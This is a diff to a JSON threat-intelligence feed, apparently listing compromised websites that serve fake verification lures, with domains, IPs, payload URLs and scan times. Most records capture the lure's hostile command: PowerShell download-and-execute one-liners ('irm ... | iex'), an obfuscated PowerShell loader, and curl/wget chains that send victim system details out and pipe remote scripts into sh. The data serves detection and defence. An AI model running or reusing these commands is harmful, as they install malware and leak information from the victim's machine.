@@ -1,5 +1,721 @@
 [
   {
+    "UrlDomain": "yourpartsgate.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "198.12.234.105"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwlpm0d71qfe0oml8871qi6j",
+    "ScannedAt": "2026-11-18T05:57:31.685000+00:00"
+  },
+  {
+    "UrlDomain": "sportelloinvitalia.opificioinnova.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/abd471ef0d9c126a",
+      "https://sportelloinvitalia.opificioinnova.it/"
+    ],
+    "IP": [
+      "46.28.0.52"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/abd471ef0d9c126a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/abd471ef0d9c126a"
+    ],
+    "ReportId": "cmwlplyi41qf40omlc44eon2x",
+    "ScannedAt": "2026-11-18T05:57:29.256000+00:00"
+  },
+  {
+    "UrlDomain": "pawscessories.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/5442447929e9128c"
+    ],
+    "IP": [
+      "52.57.221.121"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/5442447929e9128c')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/5442447929e9128c"
+    ],
+    "ReportId": "cmwlplkf81qdw0oml3lbciny2",
+    "ScannedAt": "2026-11-18T05:57:10.971000+00:00"
+  },
+  {
+    "UrlDomain": "cleanroomdesign.co.uk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/0d449009d9c037aa",
+      "https://platform.twitter.com/jot.html"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0d449009d9c037aa')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/0d449009d9c037aa"
+    ],
+    "ReportId": "cmwlplbkg1qcm0omlbdmb0flv",
+    "ScannedAt": "2026-11-18T05:56:59.520000+00:00"
+  },
+  {
+    "UrlDomain": "sritejadhruvdevchitfunds.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.197"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/102cc129e8e92eab",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/102cc129e8e92eab'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/102cc129e8e92eab"
+    ],
+    "ReportId": "cmwlpksd71q9i0omleq8xjfc9",
+    "ScannedAt": "2026-11-18T05:56:34.584000+00:00"
+  },
+  {
+    "UrlDomain": "calculadoratrabalhistaonline.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/78f180f1af8aac40"
+    ],
+    "IP": [
+      "93.127.179.219"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/78f180f1af8aac40')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/78f180f1af8aac40"
+    ],
+    "ReportId": "cmwlpkfhc1q8c0omlv0184d23",
+    "ScannedAt": "2026-11-18T05:56:17.926000+00:00"
+  },
+  {
+    "UrlDomain": "plantmarcenaria.com.br",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/57095d52c5dc257e"
+    ],
+    "IP": [
+      "172.67.145.14"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/57095d52c5dc257e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/57095d52c5dc257e"
+    ],
+    "ReportId": "cmwlpk2uf1q7h0oml0i9or5kl",
+    "ScannedAt": "2026-11-18T05:56:01.521000+00:00"
+  },
+  {
+    "UrlDomain": "www.copadenaciones.cl",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1814f655616968c8"
+    ],
+    "IP": [
+      "190.110.123.230"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1814f655616968c8')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/1814f655616968c8"
+    ],
+    "ReportId": "cmwlpjyyb1q660omlwoy1llev",
+    "ScannedAt": "2026-11-18T05:55:56.500000+00:00"
+  },
+  {
+    "UrlDomain": "www.metiers-vins-spiritueux.fr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2fe75c0f3211bc7d"
+    ],
+    "IP": [
+      "109.69.187.113"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2fe75c0f3211bc7d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2fe75c0f3211bc7d"
+    ],
+    "ReportId": "cmwlpjm421q4d0omlydgmnlvz",
+    "ScannedAt": "2026-11-18T05:55:39.885000+00:00"
+  },
+  {
+    "UrlDomain": "buckyteachesguitar.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/28f40bc7d27ab2e5"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/28f40bc7d27ab2e5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/28f40bc7d27ab2e5"
+    ],
+    "ReportId": "cmwlpjk2x1q2f0omlfvlrj65l",
+    "ScannedAt": "2026-11-18T05:55:37.244000+00:00"
+  },
+  {
+    "UrlDomain": "spiritpowerpropheticassembly.org",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d949f4f108fe9c12"
+    ],
+    "IP": [
+      "157.90.71.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d949f4f108fe9c12')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d949f4f108fe9c12"
+    ],
+    "ReportId": "cmwlpj1td1q040omlisf0rrir",
+    "ScannedAt": "2026-11-18T05:55:13.527000+00:00"
+  },
+  {
+    "UrlDomain": "cedarsolutionsinc.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "claude-flare-verification.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://claude-flare-verification.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win",
+      "https://claude-flare-verification.vercel.app/mac"
+    ],
+    "IP": [
+      "93.127.179.99"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=fccf373c-feae-425d-b6d0-ae8829deb006&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcedarsolutionsinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A53%3A10.573Z&lastShellAt=2026-11-18T05%3A53%3A10.573Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/lin"
+    ],
+    "ReportId": "cmwlpi7kr1pyj0omlfmun9v6q",
+    "ScannedAt": "2026-11-18T05:54:34.402000+00:00"
+  },
+  {
+    "UrlDomain": "dasoda.pe.kr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/dc5144f8511e6786"
+    ],
+    "IP": [
+      "141.164.60.30"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/dc5144f8511e6786')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/dc5144f8511e6786"
+    ],
+    "ReportId": "cmwlpho591pw90omljtmijqey",
+    "ScannedAt": "2026-11-18T05:54:09.189000+00:00"
+  },
+  {
+    "UrlDomain": "knok-knok.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/07bf7672d2d763f3"
+    ],
+    "IP": [
+      "160.153.0.38"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/07bf7672d2d763f3')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/07bf7672d2d763f3"
+    ],
+    "ReportId": "cmwlpgzte1puz0omloijpz5k5",
+    "ScannedAt": "2026-11-18T05:53:37.575000+00:00"
+  },
+  {
+    "UrlDomain": "www.relan-eg.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/63eecc976c03b038"
+    ],
+    "IP": [
+      "209.239.115.54"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/63eecc976c03b038')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/63eecc976c03b038"
+    ],
+    "ReportId": "cmwlpfsb81ptf0oml60s52vkk",
+    "ScannedAt": "2026-11-18T05:52:41.307000+00:00"
+  },
+  {
+    "UrlDomain": "sawh-law.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/49c93b81b4b455a5"
+    ],
+    "IP": [
+      "76.13.9.153"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/49c93b81b4b455a5')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/49c93b81b4b455a5"
+    ],
+    "ReportId": "cmwlpeqcb1ps10omlmxlygwna",
+    "ScannedAt": "2026-11-18T05:51:52.097000+00:00"
+  },
+  {
+    "UrlDomain": "tigulestore.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/c7d3869a7a1cb672"
+    ],
+    "IP": [
+      "77.37.53.92"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/c7d3869a7a1cb672')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/c7d3869a7a1cb672"
+    ],
+    "ReportId": "cmwlpej4a1pqm0omltvhissf4",
+    "ScannedAt": "2026-11-18T05:51:42.731000+00:00"
+  },
+  {
+    "UrlDomain": "werservicos.com.br",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d92b82024b5340a2"
+    ],
+    "IP": [
+      "108.179.252.182"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d92b82024b5340a2')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d92b82024b5340a2"
+    ],
+    "ReportId": "cmwlpczni1plu0oml2uhfgp83",
+    "ScannedAt": "2026-11-18T05:50:30.766000+00:00"
+  },
+  {
+    "UrlDomain": "vitacorquimica.com.br",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2e48d0b56ad1e681"
+    ],
+    "IP": [
+      "192.99.63.161"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2e48d0b56ad1e681')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2e48d0b56ad1e681"
+    ],
+    "ReportId": "cmwlpbud31pke0omlmjo0q3ju",
+    "ScannedAt": "2026-11-18T05:49:37.333000+00:00"
+  },
+  {
+    "UrlDomain": "www.systhera.at",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/54f78c6e5e159821"
+    ],
+    "IP": [
+      "159.69.241.33"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/54f78c6e5e159821')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/54f78c6e5e159821"
+    ],
+    "ReportId": "cmwlpai7x1pjg0omlgxv0lwb2",
+    "ScannedAt": "2026-11-18T05:48:34.948000+00:00"
+  },
+  {
+    "UrlDomain": "aoraxofficial.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.2"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/9a284ca408904566",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/9a284ca408904566'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/9a284ca408904566"
+    ],
+    "ReportId": "cmwlp7eru1pez0oml6hrurmma",
+    "ScannedAt": "2026-11-18T05:46:10.498000+00:00"
+  },
+  {
+    "UrlDomain": "www.dinamicaimpianti.it",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.108.56"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/4280699ca08aac34",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29916343",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/4280699ca08aac34'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/4280699ca08aac34"
+    ],
+    "ReportId": "cmwlp4p961pdv0oml42qise26",
+    "ScannedAt": "2026-11-18T05:44:04.127000+00:00"
+  },
+  {
+    "UrlDomain": "www.simcorvar.ro",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/click/08e224a04deaeb52"
+    ],
+    "IP": [
+      "89.46.6.113"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/click/08e224a04deaeb52"
+    ],
+    "ReportId": "cmwlp459p1pck0omlupkh0g51",
+    "ScannedAt": "2026-11-18T05:43:38.214000+00:00"
+  },
+  {
+    "UrlDomain": "nsutamancommunitybank.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "198.54.114.233"
+    ],
+    "Related": [],
+    "Payload": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlp3tc41pb40omlqvubrxep",
+    "ScannedAt": "2026-11-18T05:43:22.762000+00:00"
+  },
+  {
+    "UrlDomain": "sapril.my.id",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "103.147.154.191"
+    ],
+    "Related": [],
+    "Payload": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlp34b11pai0omll30hqgt8",
+    "ScannedAt": "2026-11-18T05:42:50.238000+00:00"
+  },
+  {
+    "UrlDomain": "spts.edu.pk",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "37.27.123.72"
+    ],
+    "Related": [],
+    "Payload": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare[.]io/u)\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwlp2nip1p9q0omlg9o9fhzh",
+    "ScannedAt": "2026-11-18T05:42:28.475000+00:00"
+  },
+  {
+    "UrlDomain": "lafx.asia",
+    "DeliveryUrl": [
+      "script.google.com",
+      "browse-cloud.codes",
+      "softify.lat",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display"
+    ],
+    "PayloadUrl": [
+      "https://softify.lat/u/8ecec3ba",
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "104.21.0.243"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=15e7c3a4-c67a-439f-9174-32760c4005ea&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Flafx.asia%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A41%3A03.064Z&lastShellAt=2026-11-18T05%3A41%3A03.064Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/u/8ecec3ba"
+    ],
+    "ReportId": "cmwlp2lk21p8z0oml7e63bu3s",
+    "ScannedAt": "2026-11-18T05:42:25.997000+00:00"
+  },
+  {
+    "UrlDomain": "driversexpressct.us",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.67"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/aa38ccc1a99c84b8",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/aa38ccc1a99c84b8'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/aa38ccc1a99c84b8"
+    ],
+    "ReportId": "cmwlp2bf81p7r0omlpgfmfqy3",
+    "ScannedAt": "2026-11-18T05:42:12.892000+00:00"
+  },
+  {
+    "UrlDomain": "ignyte44.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "62.72.49.96"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/66e3f1b391f2996a",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/66e3f1b391f2996a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/66e3f1b391f2996a"
+    ],
+    "ReportId": "cmwlp03z31p5p0oml6c6ety2z",
+    "ScannedAt": "2026-11-18T05:40:29.889000+00:00"
+  },
+  {
+    "UrlDomain": "decorbeam.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.146"
+    ],
+    "Related": [
+      {
+        "Value": "https://images.unsplash.com/photo-1600596542815-ffad4c1539a9?w=800&amp;h=600&amp;fit=crop",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/fe3d91f20708755d",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/fe3d91f20708755d"
+    ],
+    "ReportId": "cmwlozm4b1p4n0oml40at2ts7",
+    "ScannedAt": "2026-11-18T05:40:06.775000+00:00"
+  },
+  {
+    "UrlDomain": "eryonlabs.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "135.181.161.16"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/afdfb04a77fe289e",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29916338",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/afdfb04a77fe289e'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/afdfb04a77fe289e"
+    ],
+    "ReportId": "cmwloz3bg1p1z0omldg91fbav",
+    "ScannedAt": "2026-11-18T05:39:42.433000+00:00"
+  },
+  {
+    "UrlDomain": "deenationlogistics.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "213.190.5.39"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/236a7ae1999c1cad",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/236a7ae1999c1cad'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/236a7ae1999c1cad"
+    ],
+    "ReportId": "cmwloyxu41p0z0oml1c9kfgkz",
+    "ScannedAt": "2026-11-18T05:39:35.328000+00:00"
+  },
+  {
+    "UrlDomain": "tubaghandbag.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "104.247.167.227"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/43a0d34caa1bd616",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/43a0d34caa1bd616'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/43a0d34caa1bd616"
+    ],
+    "ReportId": "cmwloybcx1oyz0omlwavvv1vz",
+    "ScannedAt": "2026-11-18T05:39:06.181000+00:00"
+  },
+  {
+    "UrlDomain": "gtasindustry.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.13"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/5a150b8e4a467aa1",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29916331",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/5a150b8e4a467aa1'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/5a150b8e4a467aa1"
+    ],
+    "ReportId": "cmwlopj2y1oro0omlsf24a331",
+    "ScannedAt": "2026-11-18T05:32:16.292000+00:00"
+  },
+  {
+    "UrlDomain": "dataspoiler.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.139.17"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/688f43a4c4e6a9ce",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29916331",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/688f43a4c4e6a9ce'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/688f43a4c4e6a9ce"
+    ],
+    "ReportId": "cmwlopacm1oqn0oml625iut63",
+    "ScannedAt": "2026-11-18T05:32:04.947000+00:00"
+  },
+  {
     "UrlDomain": "unitedrisecare.com",
     "DeliveryUrl": [
       "browse-cloud.codes"
@@ -8289,25 +9005,5 @@
     ],
     "ReportId": "cmwel9plu0czo0omlez5ttanw",
     "ScannedAt": "2026-11-13T06:21:36.065000+00:00"
-  },
-  {
-    "UrlDomain": "www.ticconsulting.ma",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "109.234.162.18"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/4a27-e3b8-4863-8d49-fc408649faef/-/raw/main/d9-4f53-8f7a-6a6104bff2af"
-    ],
-    "ReportId": "cmwekfqsd0ciq0omld5n99u1h",
-    "ScannedAt": "2026-11-13T05:58:18.016000+00:00"
   }
 ]
